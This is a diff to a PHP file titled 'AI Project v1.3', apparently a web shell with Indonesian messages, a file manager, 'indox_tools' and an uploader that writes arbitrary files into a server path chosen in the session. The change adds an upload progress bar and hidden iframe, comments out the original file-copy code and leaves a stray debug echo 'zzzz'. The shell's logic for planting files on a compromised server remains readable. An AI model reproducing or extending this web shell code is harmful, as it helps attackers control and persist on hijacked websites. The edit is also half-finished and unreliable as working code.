@@ -1,4 +1,5 @@
 <?php
+
 session_start();
 date_default_timezone_set("Asia/Jakarta");
 
@@ -37,6 +38,20 @@ else {
 <link href="" rel="stylesheet" type="text/css">
 <title>AI Project v1.3</title>
 <style>
+
+#bar_blank {
+    border: solid 1px #FFF;
+    height: 20px;
+    width: 300px;
+}
+#bar_color {
+    background-color: #00AA00;
+    height: 20px;
+    width: 0px;
+}
+#bar_blank, #hidden_iframe {
+    display: none;
+}
 
 body{
 background-color: black;
@@ -348,19 +363,53 @@ if(isset($_GET['indox_tools'])) {
 
 //file upload
 if(isset($_FILES['file'])){
-	if(copy($_FILES['file']['tmp_name'], $_SESSION['path'].'/'.$_FILES['file']['name'])){
+	echo "zzzz";
+	/*if(copy($_FILES['file']['tmp_name'], $_SESSION['path'].'/'.$_FILES['file']['name'])){
 		echo '<font color="green">Upload Berhasil lihat di: '.$_SESSION['path'].'</font><br />';
 	}else{
 		echo '<font color="red">Upload Gagal</font><br/>';
 	}
-	unset($_SESSION['path']);
+	unset($_SESSION['path']);*/
 }
-if (isset($_GET['uploader'])) {
-	echo '<form enctype="multipart/form-data" method="POST">
-	<font color="white">File Upload :</font> 
+if (isset($_GET['uploader'])) 
+{
+	$session_upload = ini_get("session.upload_progress.name");
+	echo '
+<body>
+  <div id="bar_blank">
+   <div id="bar_color"></div>
+  </div>
+  <div id="status"></div>
+  <form action="" method="POST" id="myForm" enctype="multipart/form-data" target="hidden_iframe">
+   
+   <input type="hidden" value="myForm" name="'.$session_upload.'">
+   <input type="file" name="file"><br>
+   <input type="submit" value="Start Upload">
+  
+  </form>
+  <iframe id="hidden_iframe" name="hidden_iframe" src="about:blank"></iframe>
+  <script type="text/javascript" src="script.js"></script><br>
+  <h3>path: '.$_SESSION['path'].'
+  
+ </body>';
+
+	/*echo '<div id="bar_blank">
+			<div id="bar_color"></div>
+		  </div>
+		  <div id="status"></div>
+
+	<form enctype="multipart/form-data" method="POST" target="hidden_iframe">
+	<font color="white">File Upload :</font>
+
+	<input type="hidden" value="myForm" name="'.$session_upload.'">
 	<input type="file" name="file" />
 	<h3>path: '.$_SESSION['path'].'
-	<input type="submit" value="upload" /></form></td></tr>';
+	<input type="submit" value="Start upload" />
+
+	</form>
+	<iframe id="hidden_iframe" name="hidden_iframe" src="about:blank"></iframe>
+	<script type="text/javascript" src="script.js"></script>
+	</td></tr>';*/
 }
 
 //filemanager
